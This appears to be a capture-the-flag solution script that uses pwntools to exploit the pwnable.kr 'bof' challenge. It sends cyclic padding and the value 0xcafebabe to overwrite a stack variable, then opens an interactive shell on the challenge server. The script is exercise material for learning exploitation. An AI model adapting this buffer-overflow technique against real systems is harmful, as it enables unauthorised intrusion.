from pwn import *

host = "pwnable.kr"
port = 9000

off_overflowme = -0x2C
off_key = 0x08

r = remote(host, port)
r.send( cyclic(off_key-off_overflowme) + p32(0xcafebabe) )
r.interactive()
